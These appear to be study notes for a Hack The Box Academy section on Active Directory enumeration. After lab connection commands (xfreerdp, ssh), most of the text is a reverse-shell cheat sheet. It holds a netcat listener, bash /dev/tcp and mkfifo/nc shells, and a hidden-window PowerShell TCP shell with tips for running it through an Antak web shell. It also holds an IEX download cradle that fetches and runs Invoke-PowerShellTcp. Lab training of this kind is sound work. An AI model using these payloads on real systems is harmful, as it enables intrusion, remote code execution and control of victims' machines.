# Section 1: Introduction to Active Directory Enumeration & Attacks

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1262
- Code blocks: 3

## Block 1 — `shellsession`

```shellsession
flickpeesai@htb[/htb]$ xfreerdp /v:{{TARGET_IP}} /u:{{USERNAME}} /p:{{PASSWORD}}
```

## Block 2 — `shellsession`

```shellsession
flickpeesai@htb[/htb]$ ssh {{USERNAME}}@{{TARGET_IP}}
```

## Block 3 — `shellsession`

```shellsession
flickpeesai@htb[/htb]$ xfreerdp /v:{{TARGET_IP}} /u:{{USERNAME}} /p:{{PASSWORD}}
```

## Reverse Shells (reference)

> `{{LHOST}}` = your attack box IP, `{{LPORT}}` = your listener port.

### Listener (attacker)

```shellsession
flickpeesai@htb[/htb]$ nc -lvnp {{LPORT}}
```

### Bash reverse shell (target)

```bash
bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
```

```bash
# if /dev/tcp is unavailable, use a named pipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f
```

### PowerShell reverse shell (target)

```powershell
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

### PowerShell from inside a web shell (Antak, etc.)

> **Gotcha:** Antak (Nishang) and similar web shells run your input **inside an already-live PowerShell runspace** — there is no fresh `powershell.exe` process. Wrapping the payload in `powershell -nop -w hidden -c "..."` gets re-parsed by that runspace: the double-quoted string is expanded first, so `$c`, `$s`, etc. blank out (`$c=New-Object...` becomes `=New-Object...`) and the quotes/parens get stripped. Drop the wrapper.

Paste the raw one-liner directly (no `powershell -c "..."`, no outer quotes):

```powershell
$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()
```

Cleaner for web shells — download cradle with Nishang's `Invoke-PowerShellTcp.ps1` (host it on your attack box, then run in the web shell):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}
```
